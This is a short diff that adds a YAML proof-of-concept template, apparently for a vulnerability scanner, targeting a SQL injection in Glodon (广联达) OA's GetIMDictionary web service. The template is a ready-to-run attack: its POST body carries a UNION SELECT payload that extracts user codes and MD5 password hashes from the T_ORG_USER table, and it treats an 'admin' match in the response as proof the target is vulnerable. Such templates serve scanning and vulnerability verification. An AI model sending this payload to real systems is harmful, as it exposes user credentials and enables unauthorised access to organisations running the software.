@@ -1,0 +1,12 @@
+name: poc-yaml-广联达OA-sql
+description: "sql注入"
+method: POST
+body: "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
+headers:
+  Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+path:
+  - /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary
+expression:
+  status: 200
+  body_all:
+    - "admin"
